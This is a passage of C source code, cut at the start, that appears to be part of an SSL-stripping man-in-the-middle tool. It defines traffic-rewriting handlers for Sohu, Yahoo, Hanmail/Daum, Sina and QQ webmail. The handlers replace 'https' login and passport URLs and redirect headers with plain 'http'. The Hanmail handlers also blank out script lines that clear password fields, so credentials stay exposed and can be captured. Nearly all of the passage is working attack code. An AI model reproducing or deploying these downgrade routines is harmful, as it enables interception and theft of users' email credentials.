			ops->rhnum=0;
		
		ops->rcnum=3;
		ops->rcOps=(replaceContentFunc*)malloc(sizeof(replaceContentFunc)*ops->rcnum);
		if(ops->rcOps){
			ops->rcOps[0]=rcQqUrl;
			ops->rcOps[1]=rcQqSsl;
			ops->rcOps[2]=rcQqPwd;
		}
		else
			ops->rcnum=0;
		
		ops->snum=3;
		ops->sOps=(splitFunc*)malloc(sizeof(splitFunc)*ops->snum);
		if(ops->sOps){
			ops->sOps[0]=sQqA;
			ops->sOps[1]=sQqB;
			ops->sOps[2]=sQqC;
		}
		else
			ops->snum=0;
		
		return ops;
	}
	return 0;
}

int rhSohuEncode(void* data,int len){
	return rhWangyiEncode(data,len);
}

int rcSohuUrlA(void* data,int len){
	char* dat=data;
	char t=dat[len];
	int rt=0;
	char* uaddr=dat;
	char* pattern="https://mail.sohu.com";
	while((uaddr=strstr(uaddr,pattern))){
		memcpy(uaddr," http",5);
		rt++;
	}
	dat[len]=t;
	return rt;
}

int rcSohuUrlB(void* data,int len){
	char* dat=data;
	char t=dat[len];
	int rt=0;
	char* uaddr=dat;
	char* pattern="https://passport,sohu.com";
	while((uaddr=strstr(uaddr,pattern))){
		memcpy(uaddr," http",5);
		rt++;
	}
	dat[len]=t;
	return rt;
}

int sSohuA(void* data,int len){
	char* dat=(char*)data;
	char* pattern="https://mail.sohu.com";
	int plen=strlen(pattern);
	int i=0;
	int rt=0;
	char* caddr=dat+len-plen+1;
	while(caddr<dat+len){
		if(*caddr==pattern[i])
			i++;
		else
			i=0;
		caddr++;
	}
	rt=i;
	return rt;
}

int sSohuB(void* data,int len){
	char* dat=(char*)data;
	char* pattern="https://passport.sohu.com";
	int plen=strlen(pattern);
	int i=0;
	int rt=0;
	char* caddr=dat+len-plen+1;
	while(caddr<dat+len){
		if(*caddr==pattern[i])
			i++;
		else
			i=0;
		caddr++;
	}
	rt=i;
	return rt;
}

struct DataOperation* getSohuOps(){
	struct DataOperation* ops=(struct DataOperation*)malloc(sizeof(struct DataOperation));
	if(ops){
		memset(ops,0,sizeof(*ops));
		
		ops->hnum=pubHeadOpsNum;
		ops->hOps=pubHeadOps;
		
		ops->rhnum=1;
		ops->rhOps=(replaceHeadFunc*)malloc(sizeof(replaceHeadFunc)*ops->rhnum);
		if(ops->rhOps)
			ops->rhOps[0]=rhSohuEncode;
		else
			ops->rhnum=0;
		
		ops->rcnum=2;
		ops->rcOps=(replaceContentFunc*)malloc(sizeof(replaceContentFunc)*ops->rcnum);
		if(ops->rcOps){
			ops->rcOps[0]=rcSohuUrlA;
			ops->rcOps[1]=rcSohuUrlB;
		}
		else
			ops->rcnum=0;
		
		ops->snum=2;
		ops->sOps=(splitFunc*)malloc(sizeof(splitFunc)*ops->snum);
		if(ops->sOps){
			ops->sOps[0]=sSohuA;
			ops->sOps[1]=sSohuB;
		}
		else
			ops->snum=0;
		
		return ops;
	}
	return 0;
}

int rhYahooEncode(void* data,int len){
	return rhWangyiEncode(data,len);
}

int rhYahooSecure(void* data,int len){
	return rhGugoSecure(data,len);
}

int rhyahooLocation(void* data,int len){
	char* dat=(char*)data;
	char t=dat[len];
	dat[len]=0;
	int rt=0;
	char* pattern="Location: https://login.yahoo.com";
	char* locaddr=strstr(dat,pattern);
	if(locaddr){
		memcpy(locaddr,"Location:  http",15);
		rt++;
	}
	dat[len]=t;
	return 0;
}


int rcYahooUrlA(void* data,int len){
	char* dat=data;
	char t=dat[len];
	int rt=0;
	char* uaddr=dat;
	char* pattern="https://edit.bjs.yahoo.com";
	while((uaddr=strstr(uaddr,pattern))){
		memcpy(uaddr," http",5);
		rt++;
	}
	dat[len]=t;
	return rt;
}

int rcYahooUrlB(void* data,int len){
	char* dat=data;
	char t=dat[len];
	int rt=0;
	char* uaddr=dat;
	char* pattern="https://login.yahoo.com";
	while((uaddr=strstr(uaddr,pattern))){
		memcpy(uaddr," http",5);
		rt++;
	}
	dat[len]=t;
	return rt;
}

int sYahooA(void* data,int len){
	char* dat=(char*)data;
	char* pattern="https://edit.bjs.yahoo.com";
	int plen=strlen(pattern);
	int i=0;
	int rt=0;
	char* caddr=dat+len-plen+1;
	while(caddr<dat+len){
		if(*caddr==pattern[i])
			i++;
		else
			i=0;
		caddr++;
	}
	rt=i;
	return rt;
}

int sYahooB(void* data,int len){
	char* dat=(char*)data;
	char* pattern="https://login.yahoo.com";
	int plen=strlen(pattern);
	int i=0;
	int rt=0;
	char* caddr=dat+len-plen+1;
	while(caddr<dat+len){
		if(*caddr==pattern[i])
			i++;
		else
			i=0;
		caddr++;
	}
	rt=i;
	return rt;
}

struct DataOperation* getYahooOps(){
	struct DataOperation* ops=(struct DataOperation*)malloc(sizeof(struct DataOperation));
	if(ops){
		memset(ops,0,sizeof(*ops));
		
		ops->hnum=pubHeadOpsNum;
		ops->hOps=pubHeadOps;
		
		ops->rhnum=3;
		ops->rhOps=(replaceHeadFunc*)malloc(sizeof(replaceHeadFunc)*ops->rhnum);
		if(ops->rhOps){
			ops->rhOps[0]=rhYahooEncode;
			ops->rhOps[1]=rhYahooSecure;
			ops->rhOps[2]=rhyahooLocation;
		}
		else
			ops->rhnum=0;
		
		ops->rcnum=2;
		ops->rcOps=(replaceContentFunc*)malloc(sizeof(replaceContentFunc)*ops->rcnum);
		if(ops->rcOps){
			ops->rcOps[0]=rcYahooUrlA;
			ops->rcOps[1]=rcYahooUrlB;
		}
		else
			ops->rcnum=0;
		
		ops->snum=2;
		ops->sOps=(splitFunc*)malloc(sizeof(splitFunc)*ops->snum);
		if(ops->sOps){
			ops->sOps[0]=sYahooA;
			ops->sOps[1]=sYahooB;
		}
		else
			ops->snum=0;
		
		return ops;
	}
	return 0;
}

int rhHanmailEncode(void* data,int len){
	return rhWangyiEncode(data,len);
}

int rhHanmailSecure(void* data,int len){
	return rhGugoSecure(data,len);
}

int rcHanmailUrlA(void* data,int len){
	char* dat=(char*)data;
	char t=dat[len];
	dat[len]=0;
	int rt=0;
	char* uaddr=data;
	char* pattern="https://logins.daum.net/accounts";
	while((uaddr=strstr(uaddr,pattern))){
		memcpy(uaddr," http",5);
		rt++;
	}
	dat[len]=t;
	return 0;
}
/*
int rcHanmailUrlB(void* data,int len){
	char* dat=(char*)data;
	char t=dat[len];
	dat[len]=0;
	int rt=0;
	char* uaddr=data;
	char* pattern="https://user.daum.net";
	while((uaddr=strstr(uaddr,pattern))){
		memcpy(uaddr," http",5);
		rt++;
	}
	dat[len]=t;
	return rt;
}

int rcHanmailUrlC(void* data,int len){
	char* dat=(char*)data;
	char t=dat[len];
	dat[len]=0;
	int rt=0;
	char* uaddr=data;
	char* pattern="https://bill.daum.net";
	while((uaddr=strstr(uaddr,pattern))){
		memcpy(uaddr," http",5);
		rt++;
	}
	dat[len]=t;
	return rt;
}
*/
int rcHanmailUrlD(void* data,int len){
	char* dat=(char*)data;
	char t=dat[len];
	dat[len]=0;
	int rt=0;
	char* uaddr=data;
	char* pattern="$(v.INPUTPWD).value=\"\";";
	while((uaddr=strstr(uaddr,pattern))){
		memcpy(uaddr,"                       ",23);
		rt++;
	}
	dat[len]=t;
	return rt;
}

int rcHanmailUrlE(void* data,int len){
	char* dat=(char*)data;
	char t=dat[len];
	dat[len]=0;
	int rt=0;
	char* uaddr=data;
	char* pattern ="$(w.INPUTPWD).value=\"\";";
	while((uaddr=strstr(uaddr,pattern))){
		memcpy(uaddr,"                       ",23);
		rt++;
	}
	dat[len]=t;
	return rt;
}

int sHanmailA(void* data,int len){
	char* dat=(char*)data;
	char* pattern="https://logins.daum.net/accounts";
	int plen=strlen(pattern);
	int i=0;
	int rt=0;
	char* caddr=dat+len-plen+1;
	while(caddr<dat+len){
		if(*caddr==pattern[i])
			i++;
		else
			i=0;
		caddr++;
	}
	rt=i;
	return rt;
}
/*
int sHanmailB(void* data,int len){
	char* dat=(char*)data;
	char* pattern="https://user.daum.net";
	int plen=strlen(pattern);
	int i=0;
	int rt=0;
	char* caddr=dat+len-plen+1;
	while(caddr<dat+len){
		if(*caddr==pattern[i])
			i++;
		else
			i=0;
		caddr++;
	}
	rt=i;
	return rt;
}

int sHanmailC(void* data,int len){
	char* dat=(char*)data;
	char* pattern="https://bill.daum.net";
	int plen=strlen(pattern);
	int i=0;
	int rt=0;
	char* caddr=dat+len-plen+1;
	while(caddr<dat+len){
		if(*caddr==pattern[i])
			i++;
		else
			i=0;
		caddr++;
	}
	rt=i;
	return rt;
}
*/
int sHanmailD(void* data,int len){
	char* dat=(char*)data;
	char* pattern="$(v.INPUTPWD).value=\"\";";
	int plen=strlen(pattern);
	int i=0;
	int rt=0;
	char* caddr=dat+len-plen+1;
	while(caddr<dat+len){
		if(*caddr==pattern[i])
			i++;
		else
			i=0;
		caddr++;
	}
	rt=i;
	return rt;
}

int sHanmailE(void* data,int len){
	char* dat=(char*)data;
	char* pattern="$(w.INPUTPWD).value=\"\";";
	int plen=strlen(pattern);
	int i=0;
	int rt=0;
	char* caddr=dat+len-plen+1;
	while(caddr<dat+len){
		if(*caddr==pattern[i])
			i++;
		else
			i=0;
		caddr++;
	}
	rt=i;
	return rt;
}

struct DataOperation* getHanmailOps(){
	struct DataOperation* ops=(struct DataOperation*)malloc(sizeof(struct DataOperation));
	if(ops){
		memset(ops,0,sizeof(*ops));
		
		ops->hnum=pubHeadOpsNum;
		ops->hOps=pubHeadOps;
		
		ops->rhnum=2;
		ops->rhOps=(replaceHeadFunc*)malloc(sizeof(replaceHeadFunc)*ops->rhnum);
		if(ops->rhOps){
			ops->rhOps[0]=rhHanmailEncode;
			ops->rhOps[1]=rhHanmailSecure;
		}
		else
			ops->rhnum=0;
		
		ops->rcnum=3;
		ops->rcOps=(replaceContentFunc*)malloc(sizeof(replaceContentFunc)*ops->rcnum);
		if(ops->rcOps){
			ops->rcOps[0]=rcHanmailUrlA;
			//ops->rcOps[1]=rcHanmailUrlB;
			//ops->rcOps[2]=rcHanmailUrlC;
			ops->rcOps[1]=rcHanmailUrlD;
			ops->rcOps[2]=rcHanmailUrlE;
		}
		else
			ops->rcnum=0;
		
		ops->snum=3;
		ops->sOps=(splitFunc*)malloc(sizeof(splitFunc)*ops->snum);
		if(ops->sOps){
			ops->sOps[0]=sHanmailA;
			//ops->sOps[1]=sHanmailB;
			//ops->sOps[2]=sHanmailC;
			ops->sOps[1]=sHanmailD;
			ops->sOps[2]=sHanmailE;
		}
		else
			ops->snum=0;
		
		return ops;
	}
	return 0;
}

int rhSinaEncode(void* data,int len){
	return rhWangyiEncode(data,len);
}

int rhSinaSecure(void* data,int len){
	return rhGugoSecure(data,len);
}

int rcSinaUrlA(void* data,int len){
	char* dat=(char*)data;
	char t=dat[len];
	dat[len]=0;
	int rt=0;
	char* uaddr=data;
	char* pattern="https";
	while((uaddr=strstr(uaddr,pattern))){
		memcpy(uaddr," http",5);
		rt++;
	}
	dat[len]=t;
	return rt;
}

int rcSinaUrlB(void* data,int len){
	char* dat=(char*)data;
	char t=dat[len];
	dat[len]=0;
	int rt=0;
	char* uaddr=data;
	char* pattern="Https";
	while((uaddr=strstr(uaddr,pattern))){
		memcpy(uaddr,"Http ",5);
		rt++;
	}
	dat[len]=t;
	return rt;
}

int sSinaA(void* data,int len){
	char* dat=(char*)data;
	char* pattern="https";
	int plen=strlen(pattern);
	int i=0;
	int rt=0;
	char* caddr=dat+len-plen+1;
	while(caddr<dat+len){
		if(*caddr==pattern[i])
			i++;
		else
			i=0;
		caddr++;
	}
	rt=i;
	return rt;
}

int sSinaB(void* data,int len){
	char* dat=(char*)data;
	char* pattern="Https";
	int plen=strlen(pattern);
	int i=0;
	int rt=0;
	char* caddr=dat+len-plen+1;
	while(caddr<dat+len){
		if(*caddr==pattern[i])
			i++;
		else
			i=0;
		caddr++;
	}
	rt=i;
	return rt;
}

struct DataOperation* getSinaOps(){
	struct DataOperation* ops=(struct DataOperation*)malloc(sizeof(struct DataOperation));
	if(ops){
		memset(ops,0,sizeof(*ops));
		
		ops->hnum=pubHeadOpsNum;
		ops->hOps=pubHeadOps;
		
		ops->rhnum=2;
		ops->rhOps=(replaceHeadFunc*)malloc(sizeof(replaceHeadFunc)*ops->rhnum);
		if(ops->rhOps){
			ops->rhOps[0]=rhSinaEncode;
			ops->rhOps[1]=rhSinaSecure;
		}
		else
			ops->rhnum=0;
		
		ops->rcnum=2;
		ops->rcOps=(replaceContentFunc*)malloc(sizeof(replaceContentFunc)*ops->rcnum);
		if(ops->rcOps){
			ops->rcOps[0]=rcSinaUrlA;
			ops->rcOps[1]=rcSinaUrlB;
		}
		else
			ops->rcnum=0;
		
		ops->snum=2;
		ops->sOps=(splitFunc*)malloc(sizeof(splitFunc)*ops->snum);
		if(ops->sOps){
			ops->sOps[0]=sSinaA;
			ops->sOps[1]=sSinaB;
		}
		else
			ops->snum=0;
		
		return ops;
	}
	return 0;
}
